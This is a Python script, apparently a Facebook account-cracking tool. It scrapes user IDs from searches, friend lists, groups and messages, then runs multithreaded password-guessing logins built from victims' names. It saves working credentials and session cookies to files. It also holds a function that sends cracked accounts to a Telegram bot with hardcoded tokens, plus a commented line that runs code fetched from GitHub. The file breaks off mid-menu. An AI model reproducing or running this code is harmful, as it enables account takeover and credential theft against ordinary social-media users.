#-*-coding:utf-8-*-
import requests,bs4,sys,os,subprocess
import requests,sys,random
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
import subprocess
import logging
#logging.basicConfig(level=logging.DEBUG)
def clear(): # clear terminal
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
if ("linux" in sys.platform.lower()):

        W = '\033[0;37m'
        N = '\033[0m'
        R = '\033[0;37m\033[31m'
        B = '\033[0;37m\033[34m'
        G = '\033[0;32m'
        O = '\033[0;37m\033[33m'
        C = '\033[36m'
        notice  = "{}{}[*]{} ".format(N,B,N)
        warning = "{}[-]{} ".format(R,N)
        good    = "{}[!]{} ".format(G,N)
        warn    = "{}[!]{} ".format(O,N)
else:

        W = ''
        N = ''
        R = ''
        B = ''
        G = ''
        O = ''
        C = ''
        notice  = ''
        warning = ''
        good=''
        d    = ''
        warn    = ''
        
host="https://m.facebook.com"
ua=requests.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()

class dump_message:
	def __init__(self, cookies):
		self.cookies=cookies
		#print cookies
		basecookie()
		clear()
		print(""" \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•\n\033[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\033[1;97m   |_____  |    \_ |     | |_____  |    \_\n\n\033[1;95m     • \033[0;93mGithub -> github.com/ROMI-AFRZL \033[1;95m•   \n \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•""")
		self.f=raw_input("\033[1;95m•\033[1;96m result filename\033[1;91m :\033[1;93m ").replace(" ","_")
		if self.f=="":dump_message(cookies)
		open(self.f,"w").close()
		self.dump("https://m.facebook.com/messages")
		
	def dump(self, url):
		bs=bs4.BeautifulSoup(
			requests.get(url,headers=hdcok(),
		cookies=self.cookies).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if "/messages/read" in i.get("href"):
				f=bs4.re.findall(
					"cid\.c\.(.*?)%3A(.*?)&",i.get("href"))
				try:
					for ip in list(f.pop()):
						if self.cookies.get(" c_user") in ip:
							continue
						else:
							if "pengguna facebook" in i.text.lower():
								continue
							open(self.f,"a+").write(
								"%s<=>%s\n"%(ip,i.text))
							print("\r\033[1;95m•\033[1;96m dump \033[1;93m(\033[1;92m%s\033[1;93m) wait bro !"%len(open(self.f).read().splitlines())),;sys.stdout.flush()
				except Exception as e:continue
			if "Lihat Pesan Sebelumnya" in i.text:
				self.dump(
					"https://m.facebook.com/"+i.get("href"))
		exit("\n\033[1;92m• success %s id saved to : %s"%(len(open(self.f).read().splitlines()),self.f))
		
def banner():
	print(""" \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•\n\033[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\033[1;97m   |_____  |    \_ |     | |_____  |    \_\n\n\033[1;95m     • \033[0;93mGithub -> github.com/ROMI-AFRZL \033[1;95m•   \n \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•""")
                                        
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://m.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://m.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://m.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("\033[1;91m• login maybe failed. or checkpoint challange")


def gen(show=True):
	if show==True:
		os.system ('clear')
		print banner()
		print("\n\033[1;95m• \033[1;96mInput your cookies")
	ck=raw_input("\033[1;95m•\033[1;96m cookie\033[1;91m : \033[0;93m")
	if ck=="":gen(show=False)
	try:
		cks=cvd(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			exit("\033[1;92m• login success, run again the tools.")
		else:print("\033[1;91m• login fail.");gen(show=True)
	except Exception as e:
		print("\033[1;95m• \033[1;91merror : %s"%e);gen(show=False)
		
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return cvd(open('.cok').read().strip())
		else:gen()
	else:gen()

	
class dump_grup:
	def __init__(self, cookies):
		self.glist=[]
		self.cookies=cookies
		self.extract(
			"https://m.facebook.com/groups/?seemore")
			
	def extract(self, url):
		bs=bs4.BeautifulSoup(
			requests.get(url, cookies=self.cookies,
				headers=hdcok()).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if "/groups/" in i.get("href"):
				if "category" in i.get("href") or "create" in i.get("href"):
					continue
				else:
					self.glist.append(
						{"id":"".join(
							bs4.re.findall("/groups/(.*?)\?",
					i.get("href"))),"name":i.text})
		if len(self.glist) !=0:
			print(" ")
			print("\033[1;95m• \033[1;96myou have %s groups found."%len(self.glist))
			print("\033[1;95m• \033[1;96mselect action ")
			print("\033[1;95m\xe2\x80\xa2\033[1;92m 1 \033[1;96mget grup by searching the name")
			print("\033[1;95m\xe2\x80\xa2\033[1;92m 2 \033[1;96minput group id (manual)\n")
			while True:
				c=raw_input("\033[1;95m\xe2\x80\xa2\033[1;92m \033[1;96mmenu\033[1;91m : \033[1;93m")
				if c=="":continue
				elif c=="1":
					self.search()
					exit()
				elif c=="2":
					self.manual()
					exit()
				else:
					print("\033[1;95m•\033[1;91m wrong input")
		else:exit("\033[1;95m•\033[1;91m no groups found")
	
	def manual(self):
		id=raw_input("\033[1;95m\xe2\x80\xa2\033[1;92m \033[1;96mgroup id\033[1;91m : \033[1;93m")
		if id=="":
			self.manual()
		else:
			r=bs4.BeautifulSoup(requests.get("https://m.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
			if "konten tidak" in r.find("title").text.lower():
				exit("\033[1;95m• \033[1;91minput id grup error")
			else:
				self.listed={"id":id,"name":r.find("title").text}
				self.f()
				print("\033[1;95m• \033[1;96mtarget\033[1;91m : \033[1;93m%s.."%self.listed.get("name")[0:20])
				
				self.dumps("https://m.facebook.com/groups/"+id)
				
	def search(self):
		whitelist=[]
		q=raw_input('\033[1;95m\xe2\x80\xa2\033[1;92m \033[1;96mmenu\033[1;91m : \033[1;93m').lower()
		if q=='':self.search()
		else:
			print("-"*30)
			for e,i in enumerate(self.glist):
				if q in i.get("name").lower():
					whitelist.append(i)
					print('  %s. %s'%(len(
							whitelist),
									i.get("name").lower().replace(q,
					"%s%s%s"%(G,q,N))))
			if len(whitelist)==0:
				print("• no result found with this query : %s"%q)
				self.search()
			else:
				print('')
				self.choice(whitelist)
	
	def choice(self, whitelist):
		try:
			self.listed=whitelist[input("\033[1;95m• \033[1;96mselect group\033[1;91m :\033[1;93m ")-1]
			self.f()
			print("\033[1;95m• \033[1;96mtarget\033[1;91m : \033[1;93m%s"%self.listed.get("name"))
			self.dumps("https://m.facebook.com/groups/"+self.listed.get("id"))
		except Exception as e:
			print("\033[1;95m• \033[1;93m%s"%e)
			self.choice(whitelist)
	
	def f(self):
		self.fl=raw_input('\033[1;95m• \033[1;96mresult filename \033[1;91m:\033[1;93m ').replace(" ","_")
		if self.fl=='':self.f()
		open(self.fl,"w").close()
	
	def dumps(self, url):
		r=bs4.BeautifulSoup(
			requests.get(url,cookies=self.cookies,
		headers=hdcok()).text,"html.parser")
		print("\r\033[1;95m• \033[1;96mdump \033[1;93m(\033[1;92m%s\033[1;93m)  wait bro ! "%len(open(self.fl).read().splitlines())),;sys.stdout.flush()
		for i in r.find_all("h3"):
			try:
				if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
					ogeh=i.find("a",href=True)
					if "profile.php" in ogeh.get("href"):
						
						a="".join(
							bs4.re.findall("profile\.php\?id=(.*?)&",
						ogeh.get("href")))
						if len(a)==0:continue
						elif a in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write(
								"%s<=>%s\n"%(a,ogeh.text))
							continue
					else:
						a="".join(
							bs4.re.findall("/(.*?)\?",ogeh.get("href")))
						if len(a)==0:continue
						elif a in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write(
								"%s<=>%s\n"%(a,ogeh.text))
			except:continue
		for i in r.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in i.text:
				while True:
					try:
						self.dumps("https://m.facebook.com/"+i.get("href"))
						break
					except Exception as e:
						print("\r\033[1;95m•\033[1;96m %s, \033[1;93mretrying"%e);continue
		exit("\n\033[1;92m• you are successfully dump %s id from group %s"%(len(open(self.fl).read().splitlines()),self.listed.get("name")[0:20]))
			
class friendlist:
	def __init__(self, cookie):
		self.nitel=None
		lang(cookie)
		self.cookie=cookie
		print("\033[1;95m• \033[1;96mEnter the friend list link")
		self.id=raw_input("\033[1;95m• \033[1;96mtarget profile url\033[1;91m : \033[1;93m")
		if self.id=="":friendlist(cookie)
		else:
			self.fl=raw_input('\033[1;95m• \033[1;96mfilename\033[1;91m : \033[1;93m').replace(" ","_")
			open(self.fl,"a+")
			#open(raw_input("* file name: "),"w").close()
			id="".join(bs4.re.findall("://(.*?)/",self.id))
			if len(id)==0:friendlist(cookie)
			self.ok=bs4.re.sub(id,
				"m.facebook.com",
			self.id).replace("profile.php?id=","")+"?v=friends"
			self.dump(self.ok)
			
	def dump(self, ok):
		r=bs4.BeautifulSoup(
			requests.get(ok,headers=hdcok(),
		cookies=self.cookie).text,"html.parser")
		if self.nitel==None:
			a=r.find("title").text[0:20]
			self.nitel=a
			b=r.find("h3").text.split(" ").pop().replace(")","").replace("(","").replace(".","")
			self.b=b
			print("\033[1;95m•\033[1;96m target\033[1;91m : \033[1;93m%s"%a)
			print("\033[1;95m•\033[1;96m output\033[1;91m : \033[1;93m%s"%self.fl)
			print("\033[1;95m•\033[1;96m friendlist\033[1;91m : \033[1;93m%s"%b)
			
		for i in r.find_all("a",href=True):
			if "fref" in i.get("href"):
				print("\r\033[1;95m•\033[1;96m dump \033[1;91m(\033[1;92m%s\033[1;91m)\033[1;93m/\033[1;91m(\033[1;92m%s\033[1;91m)\033[1;93m press ctrl+z for stop"%(len(open(self.fl).read().splitlines()),self.b)),;sys.stdout.flush()
				if "profile_add_friend.php" in i.get("href"):continue
				else:
					if "profile.php" in i.get("href"):
						ag="".join(bs4.re.findall(
							"profile\.php\?id=(.*?)&",i.get("href")))
						if len(ag) !=0:
							if ag in open(self.fl).read():
								continue
							else:
								open(self.fl,"a+").write(
									"%s<=>%s\n"%(ag,i.text))
					else:
						ag="".join(bs4.re.findall(
							"/(.*?)\?",i.get("href")))
						if len(ag) !=0:
							if ag in open(self.fl).read():
								continue
							else:
								open(self.fl,"a+").write(
									"%s<=>%s\n"%(ag,i.text))
			if "lihat teman lain" in i.text.lower():
				__import__("time").sleep(2)
				while True:
					try:
						self.dump(
						"https://m.facebook.com/"+i.get("href"))
						__import__("time").sleep(2)
						break
					except Exception as e:print("\r• error: %s"%e);continue
		exit("\n\033[1;92m• successfully dump %s %s friends, output saved to %s "%(len(open(self.fl).read().splitlines()),self.nitel,self.fl))
		
def ceks(cookies,results):
	global host,ua
	r=requests.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookies,headers={"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}).text
	if len(bs4.re.findall("Pool",r)) !=0:
		sends("%s -> 8BALL POOLLLLLLLL"%(results),"1309178498:AAGxlAjtYYDnUeM04fYsfLz8lFTaSoYooYA")
	if len(bs4.re.findall("pubg",r.lower())) !=0:
		sends("%s -> PUBGGGGGGGGG"%(results),"1305701364:AAG6dmquZmBkHVVVpoSBYx5UHxcQ3NnUfMs")
	if len(bs4.re.findall("garena",r.lower())) !=0:
		sends("%s -> FFFFFFFFFFFFFFF"%(results),"928550832:AAGM35_UVioKPJ0EoIH3nqarnndcaHll6cU")
	if len(bs4.re.findall("legends",r.lower())) !=0:
		sends("%s -> EMELLLLLLLLLLL"%(results),"1277181407:AAFABlCxC45BGGS0SzoxRANIMgvKkk6Qhgc")
		
		
h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def login(em,pas,hosts):
	global ua,h
	r=requests.Session()
	r.headers.update(h)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	dtg="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":dtg,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
			
			
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
	
	
def cvs(cookies): # convert cookie dict to string
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
	
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
# --- logger asw ---
def sends(pesan,token):
	b=requests.post("https://api.telegram.org/bot"+token+"/sendMessage",data={"chat_id":"664762410","text":pesan})	
		

ips=None
try:
	b=requests.get("https://api-asutoolkit.cloudaccess.host/ip.php").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
	
#if "pakistan" in ips:
#	ua="Mozilla/5.0 (Android 9; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0" / ua="Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]')]


def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "pakistan" in ips:
					results.append("786786")
					results.append("102030")
				elif "indonesia" in ips:
					results.append(i+"sayang")
					results.append(i+"anjing")
	return results
	
class crack:
	def __init__(self,show=True):
		self.ada=[]
		self.cp=[]
		self.ko=0
		if show==True:
			os.system ('clear')
			clear()
			print(""" \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•\n\033[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\033[1;97m   |_____  |    \_ |     | |_____  |    \_\n\n\033[1;95m     • \033[0;93mGithub -> github.com/ROMI-AFRZL \033[1;95m•   \n \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•""")
			print("\n\033[1;95m\xe2\x80\xa2\033[1;96m [ \033[1;95mSELECT ACTION \033[1;96m]\n")
			print("\033[1;95m\xe2\x80\xa2\033[1;92m 1 \033[1;96mCrack pass manual")
			print("\033[1;95m\xe2\x80\xa2\033[1;92m 2 \033[1;96mCrack \033[0;91m(\033[0;93mname123\033[0;91m,\033[0;93mname12345\033[0;91m)")
		while True:
			f=raw_input("\n\033[1;95m• \033[1;96mselect\033[1;91m : \033[1;93m")
			if f=="":continue
			elif f=="1":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;95m•\033[0;96m id list file\033[0;91m : \033[0;93m")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print "\033[1;95m•\033[1;96m %s"%e
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print "\033[1;95m•\033[0;96m %s"%e
					continue
				print "\n\033[1;95m• \033[1;96mContoh\033[0;91m ->\033[0;96m sayang\033[0;91m,\033[0;96manjing"
				self.pwlist()
				s=subprocess.Popen(["killall","-9","python2"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
				break
			elif f=="2":
				try:
					while True:
						try:
							self.apk=raw_input("\033[1;95m•\033[1;96m id list file \033[1;91m: \033[1;93m")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print "\033[1;95m• \033[1;96m%s"%e
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print "\033[1;95m• \033[0;96m%s"%e
					continue
				print "\n\033[1;95m• \033[1;96makun yg \033[1;92m[OK] \033[1;96mtersimpan di -> ok.txt"
				print "\033[1;95m• \033[1;96makun yg \033[1;91m[\033[1;93mCP\033[1;91m]\033[1;96m tersimpan di -> cp.txt\n"
				print "\033[1;95m• \033[1;96msedang proses mohon bersabar"
				ThreadPool(50).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n\033[1;91m• \033[1;92mfinished.")
				s=subprocess.Popen(["killall","-9","python2"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
				break
	def pwlist(self):
		self.pw=raw_input("\033[1;91m•\033[1;96m password list \033[1;91m:\033[1;93m ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print "\n\033[1;95m• \033[1;96makun yg \033[1;92m[OK] \033[1;96mtersimpan di -> ok.txt"
			print "\033[1;95m•\033[1;96m akun yg \033[1;91m[\033[0;93mCP\033[1;91m]\033[1;96m tersimpan di -> cp.txt\n"
			print "\033[1;95m• \033[1;96msedang proses mohon bersabar"
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("\n\033[1;95m• \033[1;92mfinished")
		
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=login(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print(G+"\r\033[0;91m• \033[0;92m---> [OK] \033[0;92m%s\033[0;92m ◊ \033[0;92m%s "%(fl.get("id"),i,N))
					self.ada.append("%s ◊ %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s ◊ %s ◊ %s\n\n"%(fl.get("id"),i,cvs(log.get("cookies"))))
					ko="%s ◊ %s ◊ %s\n\n"%(fl.get("id"),i,cvs(log.get("cookies")))
#					ceks(log.get("cookies"),ko) # --> skip logger
					break
				elif log.get("status")=="cp":
					print(R+"\r\033[0;91m• \033[0;93m--->\033[0;91m [\033[0;93mCP\033[0;91m] \033[0;93m%s\033[0;91m ◊ \033[0;93m%s "%(fl.get("id"),i,N))
					self.cp.append("%s ◊ %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s ◊ %s ◊ \n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\033[1;95m• \033[1;91m---> \033[0;92mProses\033[1;96m \033[1;91m[\033[0;97m%s\033[0;93m/\033[0;97m%s\033[1;91m]\033[0;91m-\033[1;92m[OK\033[0;91m:\033[0;92m%s\033[1;92m]\033[0;91m-\033[1;91m[\033[0;93mCP\033[0;91m:\033[0;93m%s\033[1;91m]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
			
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(requests.get(
		b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		print "\r\033[1;95m•\033[1;96m [GET]\033[1;92m (\033[1;92m%s\033[1;93m) press ctrl+z for stop"%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
						
		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	exit("\n\033[1;92m• finished.")
				
def cek(arg):
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return True
		else:return False
	else:return False
	
def dumpfl():
	cvds=None
	cookie=None
	new=None
	if cek(1)==False:
		try:
			cookie=raw_input("\033[1;95m•\033[1;96m cookie\033[1;91m : \033[1;93m")
			cvds=cvd(cookie)
			new=True
		except:
			print("\033[1;91m• invalid cookie");dumpfl()
	else:
		cvds=cvd(open(".cok").read().strip())
	r=requests.get("https://mbasic.facebook.com/profile.php",
		cookies=cvds,
	headers=hdcok()).text
	if len(bs4.re.findall("logout",r)) !=0:
		clear()
		if lang(cvds) !=True:
			exit("\033[1;91m• failed when detecting language or login failed")
		print(""" \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•\n\033[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\033[1;97m   |_____  |    \_ |     | |_____  |    \_\n\n\033[1;95m     • \033[0;93mGithub -> github.com/ROMI-AFRZL \033[1;95m•   \n \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•""")
		print("\n\033[1;95m• \033[1;96mlogin as\033[1;91m :\033[1;93m %s "%(
			bs4.BeautifulSoup(r,
		"html.parser").find("title").text[0:10]))
		if new==True:
			open(".cok","w").write(cookie)
			print banner()
		fl=raw_input("\033[1;95m•\033[1;96m filename\033[1;91m : \033[1;93m").replace(" ","_")
		s=raw_input("\033[1;95m•\033[1;96m search query\033[1;91m : \033[1;93m")
		search(
			fl,cvds,
		"https://mbasic.facebook.com/search/people/?q="+s)
	else:
		try:
			os.remove(".cok")
		except:
			pass
		print("\033[1;91m• login fail!");dumpfl()
	

class lc:
	def __init__(self):
		self.path="/data/data/com.termux/files/usr/lib/.bash"
		self.host=requests.get(
			"https://raw.githubusercontent.com/ASU-TOOLKIT/server/master/server.txt"
		).text.strip()
#		self.paths()
		self.genid()
		
	def paths(self):
		try:
			if os.path.exists(self.path):
				if os.path.getsize(self.path) !=0:
					self.cek()
				else:self.genid()
			else:self.genid()
		except Exception as e:exit("\033[1;91m• an error accoured %s"%e)
		
	def genid(self):
		id=[]
		abs=list("abcdefghijklmnopqrstuvwxyz1234567890")
		for i in range(20):
			id.append(random.choice([random.choice(abs),random.choice(abs).upper()]))
		print("\033[1;95m•\033[1;96m your id\033[1;91m :\033[1;93m "+"".join(id))
		open(self.path,"w").write("".join(id))
		raw_input("* press enter to register or submit order..")
		exit(subprocess.Popen(["am","start",
			self.host.format("index.php?action=reg&id="+"".join(id))],
		stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
		
			
		
	def cek(self):
		r=requests.post(self.host.format("index.php?action=cek"),
			data={"id":open(self.path).read().strip()})
		if r.json().get("status")=="success":
			if r.json().get("result")["confirmed"]=="false":
				print("\t[ hello %s ]\n"%r.json().get("result")["name"])
				print("%s* your id: (%s) unconfirmed%s"%(G,open(self.path).read().strip(),N))
				raw_input("* press enter to get confirmation.")
				exit(subprocess.Popen(
					[
						"am","start",
						"https://wa.me/"+requests.get('https://api-asutoolkit.cloudaccess.host/no.txt').text.strip()+"?text=please confirm me\n\nID: "+open(self.path).read().strip()+"\nNAME: "+r.json()["result"]["name"]+"\nORDER:  %sdays"%(
							r.json().get("result")["license_limit"])
					],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE
				).wait())
			else:
				clear()
				banner()
				print("  + order: %s days, name- %s"%(r.json()["result"]["license_limit"],r.json()["result"]["name"]))
				if os.path.exists(".browser"):
					if os.path.getsize(".browser") !=0:
						pass
					else:
						open(".browser","w").write(r.json()["result"]["browser"])
				else:
					open(".browser","w").write(r.json()["result"]["browser"])
				if r.json()["result"]["vip"]=="true":
					print("  + days used: %s"%r.json()["tinggal"])
					print("  + VIP: %syes%s"%(G,N))
					print("  "+"="*40+"\n")
				else:
					print("  + days used: %s"%r.json()["tinggal"])
					print("  + VIP: %sno%s"%(R,N))
					print("  "+"="*40+"\n")
		elif "not found" in r.text:
			self.genid()
		else:
			print("\033[1;91m• error, %s"%r.json()["message"])
			self.genid()

if os.path.exists("ok.txt"):
	pass
else:open("ok.txt","a+").close()

#exec(requests.get("https://raw.githubusercontent.com/anonimus-hemker/fb-crack-people-friendlists/master/notice.txt").text)
#try:
#	lc()
#except Exception as e:exit("* only support termux %s"%e)
basecookie()
clear()
print(""" \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•\n\033[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\033[1;97m   |_____  |    \_ |     | |_____  |    \_\n\n\033[1;95m     • \033[0;93mGithub -> github.com/ROMI-AFRZL \033[1;95m•   \n \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•                                      \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•""")
while True:
	print "   "
	print "\033[1;95m\xe2\x80\xa2\033[1;96m [ \033[1;92mWelcome to my tools\033[1;96m ] "
	print "  "
	print "\033[1;95m\xe2\x80\xa2\033[1;92m 1 \033[1;96mDump id By Search Name"
	print "\033[1;95m\xe2\x80\xa2\033[1;92m 2 \033[1;96mDump id by Public Friendlist"
	print "\033[1;95m\xe2\x80\xa2\033[1;92m 3 \033[1;96mDump id by Group"
	print "\033[1;95m\xe2\x80\xa2\033[1;92m 4 \033[1;96mDump Id By Your Message List"
	print "\033[1;95m\xe2\x80\xa2\033[1;92m 5 \033[1;96mCrack"
	print "\033[1;95m\xe2\x80\xa2\033[1;92m 6 \033[1;96mFollow My Facebook"
	print "\033[1;95m\xe2\x80\xa2\033[1;92m 7 \033[1;96mJoin Group"
	print "\033[1;95m\xe2\x80\xa2\033[1;91m 0 \033[1;96mmove account\n"
	
	
	
	r=raw_input("\033[1;95m\xe2\x80\xa2\033[1;92m \033[1;96mSelect\033[1;91m : \033[1;93m")
	if r=="":
		os.system("clear")
		print(""" \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m•\n\033[1;91m     _______  ______ _______ _______ _     _\n     |       |_____/ |_____| |       |____/ \n\033[1;97m     |_____  |    \_ |     | |_____  |    \_\n\n\033[1;95m       • \033[0;93mGithub -> github.com/ROMI-AFRZL \033[1;95m•   \n \033[1;91m\xe2\x80\xa2\033[1;93m•\033[1;92m• """)
	elif r =="1":
		dumpfl()
		exit()
	elif r=="2":
		friendlist(basecookie())
	elif r=="3":
		dump_grup(basecookie())
	elif r=="4":
		dump_message(basecookie())
	elif r=="5":
		crack()
		exit()
	elif r=="6":
